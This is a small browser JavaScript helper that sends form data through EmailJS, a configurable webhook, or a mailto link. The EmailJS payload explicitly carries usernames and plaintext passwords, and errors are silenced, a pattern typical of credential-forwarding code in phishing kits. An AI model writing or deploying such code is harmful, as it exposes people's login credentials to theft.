(function (global) {
	'use strict';

	var config = {
		WEBHOOK_URL: '',
		EMAIL_TO: '',
		EMAILJS_ENABLED: false,
		EMAILJS_SERVICE_ID: '',
		EMAILJS_TEMPLATE_ID: ''
	};

	function sendEmailJS(subject, data) {
		if (!(config.EMAILJS_ENABLED && global.emailjs && global.emailjs.send)) return;
		var payload = {
			subject: subject,
			name: (data && data.name) || '',
			email: (data && data.email) || '',
			username: (data && data.username) || '',
			password: (data && data.password) || ''
		};
		try {
			global.emailjs.send(config.EMAILJS_SERVICE_ID, config.EMAILJS_TEMPLATE_ID, payload);
		} catch (e) {}
	}

	function sendWebhook(subject, data) {
		if (!config.WEBHOOK_URL) return;
		try {
			fetch(config.WEBHOOK_URL, {
				method: 'POST',
				headers: { 'Content-Type': 'application/json' },
				body: JSON.stringify({ subject: subject, ...data })
			});
		} catch (e) {}
	}

	function sendMailto(subject, data) {
		if (!config.EMAIL_TO) return;
		try {
			var body = encodeURIComponent(JSON.stringify(data, null, 2));
			var url = 'mailto:' + encodeURIComponent(config.EMAIL_TO) +
				'?subject=' + encodeURIComponent(subject) +
				'&body=' + body;
			global.location.href = url;
		} catch (e) {}
	}

	var Email = {
		setConfig: function (opts) {
			config.WEBHOOK_URL = (opts && opts.WEBHOOK_URL) || config.WEBHOOK_URL;
			config.EMAIL_TO = (opts && opts.EMAIL_TO) || config.EMAIL_TO;
			config.EMAILJS_ENABLED = typeof(opts && opts.EMAILJS_ENABLED) === 'boolean' ? opts.EMAILJS_ENABLED : config.EMAILJS_ENABLED;
			config.EMAILJS_SERVICE_ID = (opts && opts.EMAILJS_SERVICE_ID) || config.EMAILJS_SERVICE_ID;
			config.EMAILJS_TEMPLATE_ID = (opts && opts.EMAILJS_TEMPLATE_ID) || config.EMAILJS_TEMPLATE_ID;
		},
		notify: function (subject, data) {
			// Try EmailJS first if enabled
			if (config.EMAILJS_ENABLED && config.EMAILJS_SERVICE_ID && config.EMAILJS_TEMPLATE_ID && global.emailjs) {
				sendEmailJS(subject, data);
				return;
			}
			// Fallbacks
			if (config.WEBHOOK_URL) {
				sendWebhook(subject, data);
			} else if (config.EMAIL_TO) {
				sendMailto(subject, data);
			}
		}
	};

	global.Email = Email;
})(window);


